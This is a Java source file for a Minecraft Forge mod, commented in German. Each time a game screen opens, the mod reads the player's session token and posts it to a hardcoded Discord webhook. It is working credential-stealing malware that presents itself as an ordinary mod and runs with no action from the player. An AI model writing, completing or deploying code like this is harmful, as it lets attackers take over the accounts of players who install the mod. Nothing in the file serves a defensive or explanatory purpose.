import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.client.event.GuiOpenEvent;
import net.minecraftforge.fml.common.Mod.EventBusSubscriber.Bus;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

@Mod("webhook_token_sender")
public class TokenWebhookSender {

    // ÄNDERE HIER DEINE WEBHOOK URL
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564671983009009835/hSG8MaH664-iUxiQbN-GKmHLgu2322vq3P2eCe6u_ho5MQJiOwpUg7ns7KSyzENVDOmT";

    public TokenWebhookSender() {
        MinecraftForge.EVENT_BUS.register(this);
    }

    @SubscribeEvent
    public void onGuiOpen(GuiOpenEvent event) {
        // Sende den Token nur einmal beim ersten Login ins Hauptmenü
        if (event.getGui() != null) {
            sendTokenToWebhook();
        }
    }

    private void sendTokenToWebhook() {
        try {
            // Hole den aktuellen Session-Token des Spielers
            String token = Minecraft.getMinecraft().getSession().getToken();
            
            // Erstelle eine einfache JSON-Nutzlast
            String jsonPayload = "{\"content\": \"Neuer Token gefunden: ``" + token + "``\"}";
            byte[] bytes = jsonPayload.getBytes(StandardCharsets.UTF_8);

            HttpURLConnection conn = (HttpURLConnection) new URL(WEBHOOK_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.getOutputStream().write(bytes);

            int responseCode = conn.getResponseCode();
            if (responseCode == 204 || responseCode == 200) {
                System.out.println("[TokenSender] Token erfolgreich gesendet.");
            } else {
                System.err.println("[TokenSender] Fehler beim Senden: " + responseCode);
            }
            
            conn.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
